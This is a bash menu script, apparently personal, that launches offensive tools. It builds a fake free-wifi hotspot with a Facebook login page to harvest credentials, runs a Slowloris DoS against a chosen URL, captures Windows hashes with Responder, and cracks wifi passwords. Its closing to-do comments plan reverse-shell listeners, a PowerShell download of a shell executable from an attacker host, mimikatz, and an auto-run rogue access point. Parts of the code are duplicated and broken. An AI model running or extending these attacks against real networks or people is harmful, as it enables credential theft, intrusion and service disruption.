#!/bin/bash 

exe() { echo "Running \"\$ $@\" in 5 seconds"; sleep 5 ; $@ ; } #Show and execute comand. Usage: exe eval 'ls -F | grep *.txt'

banner() #Show in a more beaultful mode
{
    echo "+------------------------------------------+"
    printf "| %-40s |\n" "`date`"
    echo "|                                          |"
    printf "|`tput bold` %-40s `tput sgr0`|\n" "$@"
    echo "+------------------------------------------+"
}

# Menu Option Wifiphisher
menuwifiphisher() {

    while :
    do

       banner "Chose an Option"
       echo "1 - Open Interface WifiPhisher"
       echo "2 - Free Wifi (Capture Facebook)"
       echo "0 - exit"

        read optionwifiphisher
        case $optionwifiphisher in
            1)
            exe sudo wifiphisher
            exe sudo systemctl start NetworkManager #Restart networkManager after closing

            ;;
            2)
	    read -p "Enter the name for the Fake Wifi(if blank default is: FREE): " essidwifihack

            read -p "Use Know Beacons? Y/N (Some Comum wifinames - blank Default is NO): " useknowbeacons

            case "$useknowbeacons" in #here we have a new case for select one submenu
                Y|y)
                useknowbeacons=-kB #Set the default content to -kB for use in atack script
                ;;
                N|n|"")
                ;;
                *)
                printf "Invalid Option, no use know beacons"
                ;;
            esac

	    essidwifihack=${essidwifihack:-"Copel Telecom Free Wifi"}

             exe sudo wifiphisher --essid "$essidwifihack" -p oauth-login $useknowbeacons

            ;;
            0)
            printf "Return to Initial Menu"
            break
            ;;
            *)
            printf "Invalid Option\n\n"
            ;;
        esac
    done
}

#menu for tshark (Wireshark non-Graphical)
menutshark() {

    read -p "Use an especific network card? type the mame of the card or enter to continue: " tsharknetworkcard

    [[ ! -z $tsharknetworkcard ]] && tsharknetworkcard="-i $tsharknetworkcard"  #if insert a card then ad to the comand

    printf "Need a especifc capture fetch filter? -(f) \n" 

    printf "\n
    Fetch Filters
    Filter:| Description
    host:| 4 Decimal digit dot separeted IP address
    net:| A range of decimal digit dot separeted IP address 
    srv net:| From a range of IP address 
    dst:| To range of IP address  
    mask:| To apply to IP address  
    arp:| Address Resolution Protocol 
    ether proto:| Ethernet type field 
    ether dst:| Ethernet MAC address of destination 
    broadcast:| Broadcast message across the network 
    multicast:| Ethernet Multicast Packet 
    tcp portrage:| Hypen (-) separeted range of TCP port numbers 
    dst port:| TCP destination port  
    tcp port:| TCP port number 
    ip:| All IPv4 traffic 
    pppoes:| All PPPOoE traffic
    vlan:| All Vlan port Number 
    port:| TCP port number 
    portocol:| You can Type the protocol name without \"quotes\" 
    ----:| ----
    not:| NOT the following 
    and:| Logical AND of the two adjacents parameters 
    or:| Logical Or of the two adjacent parameters 
    "| column -t -s ":" # run the atual print in a table format and with : as separator

    read -p "Please intert the filter without \"quotes\" or type ENTER to continue: " tsharkfetchfilter

    [[ ! -z $tsharkfetchfilter ]] && tsharkfetchfilter="-f \"$tsharkfetchfilter\""

    printf "Need a especifc capture yank filter? -(Y) \n" 

    printf "\n
    Yank Filters
    Filter:| Description
    frame.time:| 
    frame.time_relative:| Relative packet time stamp
    frame.len:| Lenght of the packet
    eth.addr:| 6 hex digit colon separeted ethernet MAC address
    eth.dst:| 6 hex digit colon separeted destination MAC address
    ip.addr:| 4 decimal digit dot separeted IP address
    ip.srv:| Sender's IP address
    ip.dst:| Reciver's IP address
    ip.len:| Length of the IP packet 
    tcp.srcport:| TCP source port
    tcp.port:| TCP port Number
    tcp.dstport:| TCP destination port
    udp.port:| UDP port number
    col.info:| Received Packet's content
    http.response.code:| HTTP Response code number
    http.request.method:| GET or POST
    && || >< == !:| Logical Operators
    "| column -t -s ":" # run the atual print in a table format and with : as separator

    read -p "Please intert the filter without \"quotes\" or type ENTER to continue: " tsharkyankfilter

    [[ ! -z $tsharkyankfilter ]] && tsharkyankfilter="-Y \"$tsharkyankfilter\"" 

    read -p "Use Monitor / Promiscuos mode? (-I). Type Y or enter to continue: " tsharkusemonitor

    case "$tsharkusemonitor" in 
        Y|y)
        tsharkusemonitor="-I" #if user type y then use monitor mode 
        ;;
        *)
        tsharkusemonitor="" 
        ;;
    esac

    read -p "Save pcapng output? (-w). Insert the path to the file or type enter to continue: " tsharkpcapoutput

    [[ ! -z $tsharkpcapoutput ]] && tsharkpcapoutput="-w \"$tsharkpcapoutput\"" 

    read -p "Especify a maximum number of packages(-c)(type a number or enter to unlimited): " tsharknumberofpackages

    if [[ ! -z $tsharknumberofpackages ]]
    then

        rechecknumber='^[0-9]+$'  # regular expression to check if its a number
        if  [[ $tsharknumberofpackages =~ $rechecknumber ]]  # If typed a number 
        then
            tsharknumberofpackages="-c $tsharknumberofpackages" 
        else
            tsharknumberofpackages=""  # Empty the conent in case of are not numbers
            echo "The value insert its not a number running with unlimited packages"
        fi
    fi

    read -p "Show package contents(-x) Type Y or enter to continue: " tsharkshowpackagecontents

    case "$tsharkshowpackagecontents" in 
        Y|y)
        tsharkshowpackagecontents="-x" #show package contents
        ;;
        *)
        tsharkshowpackagecontents="" 
        ;;
    esac

    read -p "Show more information on packets(PacketTree)(Type Y or enter to continue): " tsharkshowpackagtree

    case "$tsharkshowpackagtree" in 
        Y|y)

           read -p "Type Especific Protocols (-O)(Comma separeted) or leave blank for all packages (-V): " tsharkshowpackagtree

            [[ ! -z $tsharkshowpackagtree ]] && tsharkshowpackagtree="-O \"$tsharkshowpackagtree\"" ||  tsharkshowpackagtree="-V" #show package contents
        ;;
        *)
        tsharkshowpackagtree="" 
        ;;
    esac

    exe eval sudo tshark --color -T tabs -z expert $tsharknetworkcard $tsharkfetchfilter $tsharkyankfilter $tsharkusemonitor $tsharkpcapoutput $tsharknumberofpackages $tsharkshowpackagecontents $tsharkshowpackagtree #run the script

}

searchallips(){

    read -p "Please insert the ip range (Syntax: 192.168.100.0/24) or press ENTER to use your gateway. WARNING! This tatic uses ping, so is highly detectable: " rangeip

    read -p "Type the path and file for log or type ENTER to do not log: " searchallipslog

   [[ -z $rangeip ]] && selectwificard

   rangeip=$(ip r | grep $selectedwificard | grep src | cut -d " " -f1) #if not insert a gateway use the default 

    [[ $searchallipslog ]] && searchallipslog="-oN $searchallipslog" 

    exe eval "sudo nmap -sn -PS22,3389 -PU161 $rangeip $searchallipslog"

    read -p "Type ENTER to continue" 

}

kismetmenu(){

  selectwificard #show an menu and return the response

    echo "Putting interface $selectedwificard into monitor mode"
    exe eval "sudo airmon-ng start $selectedwificard" #change to monitor mode
     
    read -p "Need some logging? By default we use no logging option (-n). Type Y if to logging or enter to continue: " kismetmenulogging

    case "$kismetmenulogging" in 
        Y|y)
        kismetmenulogging="" #use the default for kismet with log
        kismetmenuloggingmessage="Your log will be in $(pwd)"
        ;;
        *)
        kismetmenulogging="-n" 
        ;;
    esac

    exe eval "sudo kismet -c ${selectedwificard}mon $kismetmenulogging"

    echo "Putting interface $selectedwificard into normal mode"
    exe eval "sudo airmon-ng stop ${selectedwificard}mon" #change to normal mode

    echo $kismetmenuloggingmessage #Show logging message if exists"

}



    #CONTINUE THE UPDATE ON THE SCRIPT AFTER HERE!!!






    slowhttptestmenu(){
    

    while [ -z "$slowhttptesttargeturl" ] #in loop unless the user inset a comand
    do

        read -p "Please intert the target absolute URL: " slowhttptesttargeturl

    done
        exe eval "slowhttptest -c 1000 -H $comandlogfile -i 10 -r 200 -t GET -u $slowhttptesttargeturl -x 24 -p 3"

}


dirsearchmenu(){

    while [ -z "$targeturl" ] #in loop unless the user inset a comand
    do

        read -p "Please insert the target URL: " targeturl

        [ ! -z "$targeturl" ] && read -p "Please insert the extension (whitout \".\") to the search. Type enter to default (PHP): " dirsearchextension

        [ ! -z "$targeturl" ]  && read -p "Please instert a wordlist or tipe ENTER to use the default: " dirsearchwordlist 
        
	[ $dirsearchwordlist ] && dirsearchwordlist="-w $dirsearchwordlist" #create the comand to user wordlist 
    
done






    #CONTINUE THE UPDATE ON THE SCRIPT AFTER HERE!!!


    exe eval sudo tshark --color -T tabs -z expert $tsharkfetchfilter $tsharkyankfilter $tsharkusemonitor $tsharkpcapoutput $tsharknumberofpackages $tsharkshowpackagecontents #run the script

}

dirsearchmenu(){

    while [ -z "$targeturl" ] #in loop unless the user inset a comand
    do

        read -p "Please insert the target URL: " targeturl

        [ ! -z "$targeturl" ] && read -p "Please insert the extension (whitout \".\") to the search. Type enter to default (PHP): " dirsearchextension

        [ ! -z "$targeturl" ]  && read -p "Please instert a wordlist or tipe ENTER to use the default: " dirsearchwordlist 
        
	[ $dirsearchwordlist ] && dirsearchwordlist="-w $dirsearchwordlist" #create the comand to user wordlist 
    
done

        dirsearchextension=${dirsearchextension:-php} #if not insert then set the default extension

        exe eval "dirsearch.py -u $targeturl -e $dirsearchextension -r $dirsearchwordlist --random-agents"

}

torghostmenu(){

    echo "WARNING!! Disable ipv6 before start, after end check the https://ipleak.net/ report or acess the site"
    echo "This program will fully anonymize the acess through Tor network"
    read -p "Press enter to start or type STOP to stop: " startorstop

    [ $startorstop ] && comandtorghost="-s" || comandtorghost="-x"

    echo "The network will restart, please check at the end if you are really out Tor Network"

    changemacadress #self explained :)

    exe eval "sudo torghost $comandtorghost"

    echo "WARNING! Check the result before to avoid errors!"
    exe eval "curl -s https://check.torproject.org/ | head | grep \"Tor.\""

    echo "WARNING!! Check the information below to avoid DNS Leaks or acess https://ipleak.net/ to verify"
    exe eval "curl https://ipleak.net/json/"

}

wifite2menu(){

    read -p "For best resultions type the path for a better wordlist or type enter to use the default" wifitewordlist

    [ ! -z "$wifitewordlist" ] && comandwifitewordlist="--dict $wifitewordlist"

    exe eval "sudo wifite $comandwifiteworllist --random-mac --verbose" 

    selectwificard 

    exe eval "sudo airmon-ng stop $wifitoativate" #reativate wificard
}


securepingmenu(){

    while [ -z "$targeturl" ] #in loop unless the user inset a comand
    do

        echo "Please insert the target URL"
        read targeturl

        echo "Runing \"nmap -sT -Pn $targeturl\" ( -sT for 3-way-handshake complete and -Pn for do not use ping )\""
        nmap -sT -Pn $targeturl

        echo ""

    done

}

changemacadress(){

    echo "To change the macadress please type the name of the card."
    echo "Our atual wifi cards are:\n"
    echo "Running \"ip a | grep state | cut -d: -f2\""
    ip a | grep state | cut -d: -f2 #show only wifi cards
    
    selectwificard

    while [ -z "$selectedwificard" ] #in loop unless the user inset a comand
    do

    echo "WARNING!!! CHECK IF THE MACADRESS REALLY CHANGE"

    echo "Runing \"sudo macchanger -r $ethernetcardtochange\""
    sudo macchanger -r $ethernetcardtochange

    echo "Runing \"sudo ip link set $ethernetcardtochange up\""
    sudo ip link set $ethernetcardtochange up
    done

}

respondermenu(){

    selectwificard  #show an menu and return the response

    echo "This program saves the HASHs in \"/opt/Responder-Master/logs\" if the atack works please check this directory  "
    echo "if a Hash is located use a program like john the ripper to decript"
    exe eval "sudo killall dnsmasq -9 "
    exe eval "sudo responder -vI $selectedwificard -wrf" 

}

jhontheripper(){

        echo "falta terminar"
    #after this use jhon the reaper,
    # john SMB-NTLMv2-SSP-192.168.100.101.txt –wordlist=/usr/share/wordlists/rockyou.txt
    #or maybe hashcat? search the best
    #if use jhone the reaper, study chttps://github.com/SpiderLabs/KoreLogic-Rules/blob/master/kore-logic-rules-top7.txt seens to be good is from spiderlabs, so its good

    #i think jhonthereaper is best for cpu power and hashcat to gpu power?
}

selectwificard(){ #usage = call the function em then read the variable selectedwificard

    echo "Our atual wifi cards are:\n"
    echo "Running \"ip a | grep state | cut -d: -f2\""
    ip a | grep state | cut -d: -f2 #show only wifi cards


    while [ -z "$selectedwificard" ] #in loop unless the user inset a comand
    do

            echo "Please select one wificard"
            read selectedwificard

    done

    }


httrackmenu(){

    while [ -z "$COPYPAGE" ] #in loop unless the user inset a comand
    do

            echo "Please inset the page to copy with http://"
            read COPYPAGE


    done

      echo "Please inset the page destination, or type ENTER to use  "./" as the default"
      read PAGEDESTINATION

      test  -z $PAGEDESTINATION && PAGEDESTINATION="." #if not insert a page destination use the default

    echo $PAGEDESTINATION

    echo "Running \"httrack $COPYPAGE -O $PAGEDESTINATION -%!\""
    httrack $COPYPAGE -O $PAGEDESTINATION -%!

}

cpfgenerator(){

    # gera 3 sequência de 3 caracters, números randômicos.
    for i in {1..3};
    do

         a+=$(($RANDOM%9));
         b+=$(($RANDOM%9));
         c+=$(($RANDOM%9));

    done

    # estabelece o valor temporário do cpf, só pra poder gerar os digitos verificadores.
    cpf="$a$b$c"

    # array pra multiplicar com o 9(do 10 ao 2)primeiros caracteres do CPF, respectivamente.
    mulUm=(10 9 8 7 6 5 4 3 2)

    # um loop pra multiplicar caracteres e numeros.Utilizamos nove pois são 9 casas do CPF
    for digito in {1..9}
    do

        # gera a soma dos números posteriormente multiplicados
        let DigUm+=$(($(echo $cpf | cut -c$digito) * $(echo ${mulUm[$(($digito-1))]})))

    done

    # divide por 11
    restUm=$(($DigUm%11))

    # gera o primeiro digito subtraindo 11 menos o resto da divisão
    primeiroDig=$((11-$restUm))

    # caso o resto da divisão seja menor que 2
    [ $restUm -lt 2 ]; primeiroDig=0

    # atualizamos o valor do CPF já com um digito descoberto
    cpf="$a$b$c$primeiroDig"

    # agora um novo array pra multiplicar com o 10(do 11 ao 2) primeiros caracteres do CPF, respectivamente.
    mulDois=(11 10 9 8 7 6 5 4 3 2)

    for digitonew in {1..10}
    do

        let DigDois+=$(($(echo $cpf | cut -c$digitonew) * $(echo ${mulDois[$(($digitonew-1))]})))

    done

    # também divide por 11
    restDois=$(($DigDois%11))

    # gera o segundo digito subtraindo 11 menos o resto da divisão
    segundoDig=$((11-$restDois))

    # caso o resto da divisão seja menor que 2
    [ $restDois -lt 2 ]; segundoDig=0

    # exibe o CPF gerado e formatado.
    echo -e "\033[1;35mO CPF gerado é:"
    echo -e "\033[1;32m$a$b$c$primeiroDig$segundoDig\033[0m"
    echo -e "Type ENTER to continue"
    read cpf

}

showmenu(){

    while :
    do
        

         banner "Chose an Option:"
         echo "1 - Wifi Hack Tools"
         echo "2 - DDoS, Network and Webserver Tools"
         echo "3 - TShark (Wireshark Non-Graphical)"
         echo "4 - Anonymize kali"
         echo "5 - Windows Network Hacking Tools "
         echo "6 - CPF Generator (Brazilian equivalent to Social Securty Number)"
         echo "7 - Jhon the ripper"
         echo "0 - exit"

        read SELECTEDTOOL
        case $SELECTEDTOOL in
            1)
                while :
                do
                    banner "Chose an Option:"
                    echo "1 - Wifiphisher (Capture wifi credentials)"
                    echo "2 - Kismet (Wifi Network Surveillance tool with a web interface)"
                    echo "3 - Wifite2 (Automated Password Craking)"
                    echo "4 - Yersinia (Atack Network Protocols especially Cisco)"
                    echo "0 - exit"

                    read SELECTEDTOLLWIFIMENU
                    case $SELECTEDTOLLWIFIMENU in
                        1)
                        menuwifiphisher
                        ;;
                        2)
                        kismetmenu
                        ;;
                        3)
                        wifite2menu
                        ;;
                        4)
                        sudo yersinia -I
                        ;;
                        0)
                        break
                        ;;
                        *)
                        echo "Invalid Option"
                        ;;
                    esac
                done
            ;;
            2)
                while :
                do
                    banner "Chose an Option:"
                    echo "1 - Slowhttptest (Simple DDoS using SlowLoris technique)"
                    echo "2 - Dirsearch (Check hidden directories in websites)"
                    echo "3 - Dirburster (Graphical Interface to Check hidden directories in websites)"
                    echo "4 - Httrack (Download complete sites)"
                    echo "5 - Search all IPs in a network"
                    echo "6 - Secure ping (using nmap)" 
                    echo "0 - exit"

                    read SELECTTOLLWEBMENU
                    case $SELECTTOLLWEBMENU in
                        1)
                        slowhttptestmenu
                        ;;
                        2)
                        dirsearchmenu
                        ;;
                        3)
                        sudo dirbuster
                        ;;
                        4) httrackmenu
                        ;;
                        5)
                        searchallips
                        ;;
                        6)
                        securepingmenu
                        ;;
                        0)
                         break
                        ;;
                        *)
                        echo "Invalid Option"
                        ;;
                    esac
                done
            ;;
            3)
            menutshark
            ;;
            4)
            while :
            do

                banner "Chose an Option:"
                echo "1 - Torghost (Fully Anonymize kali)"
                echo "2 - Change MacAdress"
                echo "0 - exit"

                read SELECTTOLLANONYMIZEMENU
                case $SELECTTOLLANONYMIZEMENU in
                    1)
                    torghostmenu
                    ;;
                    2)
                    changemacadress
                    ;;
                    0)
                    break
                    ;;
                    *)
                    echo "Invalid Option"
                    ;;
                esac
            done
            ;;
            5)
            while :
            do

                banner "Chose an Option:"
                echo "1 - Responder (Locate windows credentials in network)"
                echo "0 - exit"

                read SELECTTOOLRESPONDERMENU
                case $SELECTTOOLRESPONDERMENU in
                    1)
                    respondermenu
                    ;;
                    0)
                    break
                    ;;
                    *)
                    echo "Invalid Option"
                    ;;
                esac
            done
            ;;
            6)
            cpfgenerator
            ;;
            7)
            jhontheripper
            ;;
            0)
            banner "Bye"
            break
            ;;
            *)
            echo "Invalid Option"
            showmenu
            ;;
        esac
    done

}
showmenu #show de initial nem


        #future features           
        #0.0. O menu do change mac adress não esta fucnionando corretamente corrige lá
        #0.1. Revisa se esta funcionando certinho e altera de torghost para torghostNG. tem o comando que deve ser usado no notes
        #1.1 Implementa o Jhon The reaper aqui no codigo, tem a logica no notion
         #2 - Muda todas as vezes que preciso solicitar uma placa de wifi para o nome que vem da função selectedwificard
         #3 - Revisa o codigo com melhores praticas da pra diminuir bastante coisa
         #9 - Estuda e implemneta nmap
         #9.1 Faz uma opção no nmap com vull script like sudo nmap -sS --script vuln -vv www.moleta.com.br
         #10 - Faz um menu para ganhar acesso powershell em windows usando o comando a seguinr  \psexec.py administrator@10.10.10.27\" tem um exemplo no primeior hack do hackthebox " 
         #10.1 - Revist the script, read the script from the top to the begining and see what cam be done better
         #11 - Faz um menu pra conectar no msql usando o padrao acima, sendo que o login é o começo o ip é o do servidor mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27 -windows-auth
         #12 - Um menu para criar um webserver temporario usando python ---- sudo python3 -m http.server 80
         #13 - Muda todas as variaveis para minuscula é uma boa pratica pois variaveis do sistema são em maiuscula
         #14 - Faz um menu pra dar start no metaspoit: msfdb int .... msfconsole
         #15 - Add -vv para todos os comandos nmap do script pra poder acompanhar em tempo real
         #16 - Cria um menu para bruteforce e dentro do menu na hora que escolhe faz uma observação em cima como uma opçoa 0 por exempol ocrito 0 - OBS! If you need to scan a dns or vhost there is a alwsome tool called GoBuster, study.
         #17 - Estuda e coloca um menu pra dar airodump que exibe as conexões, se não me engano é sudo irodump-ng wlan0 mas testa e acho que precisa colocar em modo monitor também usando o airclack ou algo assim 
         #18 - Implementa o Hydra, é uma exelente ferramenta de bruteforce, já tem no notes uma logica de programação
         #19 - Coloca o dirsearch para rodar como sudo, pois assim consegue salvar logs normalmente, pois esta sem permissõa
         #20 - tem umas opções mais completas no dirsearch como por exemplo usar uma lista de extenções, que deve ser tipo cvs, além de outras coisas, como recursivo ou nao e o nivel de recursividade, coloca no codigo, estuda melhor e planeja pra diexar o mais completo possivel
         #20.1 - Revist the script, read the script from the top to the begining and see what cam be done better
         #21 - subistituo onde esta test por [[ comand ]] é um jeito melhor de se fazer e o outro jetio esta obsoleto
         #22 - estuda o crunch e implementa no script é um otimo programa para gerar listas de senhas para quando precisar descobrir uma senha mas já tem um padrão em mente
         #24 - Sera que este é o mlehor jeit ode fazer menu possivel? Vis sobre a possibilidade de usar o comand select do bash, da uma estudada nisso, pode ser uma boa tem mais aqui https://wiki.bash-hackers.org/syntax/ccmd/user_select
         #25 - Sera que estudar o print e usar no lugar do echo não é melhor? pesquisa
         #26 - Veja se existem outras boas ferramentas para descobrir senha de wifi, é o tipo de coisa que impresiona cliente, então é bem ultil saber o maximo possível 
         #27 - Eu não sei se é possivle, mas se for que tal dar uma estudada no pyshark? e implentar aqui em um script de bash, é possivel ou so quando este script mudar pra python?
         #28 - Implement patetor? it is a best tool? then Hydra? Search more.
         #29 - Implement study mor about reponder.py, and add to the script a method to crack a password using jhon the reaper Faz um menu para o jhon the reaper john SMB-NTLMv2-SSP-192.168.100.101.txt –wordlist=/usr/share/wordlists/rockyou.txt porque é relacionado ao responder.py
         #30 - Tem algum jetio de colocar romandos pra rodar no metasploit por aqui? seria sensacional, ai conforme eu for aprendendo eu vou adiciondo, tambem tem a questão que tira pra aprender bem e se possivel até fazer um curso de metasploit é uma ideia exelente, planeja melhor
         #30.1 - Revist the script, read the script from the top to the begining and see what cam be done better
         #31 - Create a function to check if a program is instaling before runnning and if not instaled then ask to install, and apply to all my tools in this script
         #32 - Study and implement hashcat 
         #32 - Create a Function who: 1 - you imput an wifi nam 2 -  the coputer clone that mac adress from the AP to avoid detection, 3 - Show options to crack that wifi, like: Show a fake iput from password, and automated tools using weakness
         #33 - Buy a nano wifi card, insert on the notebok and build an script who: 1 - Check what wifi i am in 2 - Wifi my wifi != Casinha Than - 3 - Run an script who create fake wifis and capute passwords using an fake facebook login 4 - Put that script to run automatic at boot of my notebook
        #34 - Replace all echos for printf, its better
        #35 - See how i avoid to use eval, its too bat for security
        #36 - Study and implement a funciontion using curl, there so much good about, like set and get cookieas, or send post, is very versatile
        #37 - insert sudo python -m SimpleHTTPServer 80 on the comands to create a simple webserver and study about
        #38 - Study and implement an script using WinPEAS.exe, maybe an .bat? to automatize?
        #39 - Study Msfvnom and implement, it is an excelent payload generator[:]
        #40 - Study and implent rlwrap nc -lnvp 4444 its realy good to reverse shells and study about the rlwarp ok? to understend perfectly
        #40.1 - Revist the script, read the script from the top to the begining and see what cam be done better
        #41 - Create a menu with util stuff, like "powershell "(New-Object System.Net.WebClient).Downloadfile('http://<ip>:8000/shell-name.exe','shell-name.exe')" this is for download archives using powrshell
        #42 - Put in dirsearch an option to save the output, its awsome to CTFs  and reports
        #43 - study the best directory wordlist, to use in dirbuster or afuzz, or another tool
        #44 - Study and implement wpscan, its a good tool to break into wordpress sites
        #45 - Cretate a menu who check if two ips are in them same network. This same menu can, calculate things like, create networks for ips, like: i need 2 networks with a minimum 200ips, or i need an netsplit a network in 3 other networks, things like this. And print a tamble explaining the result showing the binaries in colours
        #46 - Study and implement rustscan, its a realy good tool. There is a github repository
        #47 - Sudy and inplement inplement  One-Lin3r its a realy good tool to acelerate the process of geting reverse shells, and other scripts
        #48 - Migrate the Script to Python, sarch for a method to run bash code inside python an migrate gradually if possible, if not, than create an second script and start the developmenti
        #49 - Create a Function who update the script with the last features implemented in the github version
        #50 - Revist the script, read the script from the top to the begining and see what cam be done better
        #51 - Study and implement Nessus? Its a realy good scanner
        #52 - Create .MD archick with this future modifications, its better for organization
        #53 - If don't exist yet, make an script to automate deauth all dispositives in an network, maybe in more than one if possible
        #54 - Organize the menu in a better way, is too confuse
        #55 - Implement a flag to disable the notification "command will running in 5 seconds, or even change the time"
        #56 - Study massscan, its good for mass scaning ports, 
        #57 - Add an option to windows tools, like mimikatz and think if only show then or run then, i think run its better, butt tike about
        #58 - Study and implement msfvenom its a great tool to make palyloads 
        #59 - Study and implement nikto
        #60 - Revist the script, read the script from the top to the begining and see what cam be done better
        #61 - Create a menu option to nessus, the option was to start the server and show the link to browser in terminal. And Obviusly study more about. Nessus its a realy great tool. Its good to gerate repots to clients
        #62 - Study and implement termshark, its good to see pcaps in terminal
        #63 - Study and implement FFUF, its really fast because its in go
        #64 - Implement option so search ".bak" in in websearches, it really good to see some codes
        #65 - Study and implement Uchecker, its a good tool to check for not uptodate tools on servers
        #66 - Study and implement Snort, its a preaty good to to check for viruses in network, its good for networks and home users
        #77 - THE CPF Generator is broken, test and correct or... maybe remove, there good sites doing this, i think its no necessarily and anymore
        #78 -  Study and implment sublist3r, its a really great scanner for subdomains ussing ossint
        #79 - Study and implement pwncat, its a really great reverse shell hander, is the one by calleb stuart, not the other
        #80 - Revist the script, read the script from the top to the begining and see what cam be done better
        #81 - Study and implment nikton its a good webscaner
        #82 - Study and implment social engenner tookit, its really god to work with social engineer
        #83 - Change DirBuster by Gobuster? Search more about... Gobuster has more users, maybe its better? actualy is more faster than dirbuster, so thats is what matter
        #84 - Implement wfuzz its preaty great
        #85 - Study and Implement Sqlmap
        #86 - Implement te 'sectlist' program from kali, its a copy for the repository on github. Maybe a menu here or an option to use in the aplications who neded, also study what is the best wordlists for who?
        #87 - Study and implent enum4linux, its preaty good to use to enumerate samba shares
        #88 - Create an option to disable showing comands after runnning. Maybe a flag before ruing? like BRHackTools -noverbose
        #89 - Study and implement sherlock, its a great tool for OSINT
        #90 - Revist the script, read the script from the top to the begining and see what cam be done better
        #91 - Study and implement airgedon its good to do deauth atacks in softwarey
        #92 - What i can do to make this script more beautiful? Maybe some colors or ident?
